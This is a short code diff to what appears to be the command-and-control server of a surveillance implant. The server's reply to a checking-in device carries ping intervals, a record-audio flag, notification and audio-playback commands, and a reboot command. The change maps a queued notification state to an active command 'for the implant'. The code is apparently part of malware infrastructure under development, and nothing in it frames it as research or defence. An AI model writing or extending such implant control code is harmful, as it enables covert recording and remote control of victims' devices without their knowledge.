@@ -1615,7 +1615,8 @@ async def receive_report(
         "status": "success",
         "next_ping_seconds":    ping_interval,
         "record_audio":         record_audio,
-        "notification_command": notif_state,
+        # Convert internal Queued state (2) to Active command (1) for the implant
+        "notification_command": 1 if notif_state == 2 else notif_state,
         "notification_text":    notif_text,
         "play_audio":           play_audio,
         "reboot_cmd":           reboot_cmd,
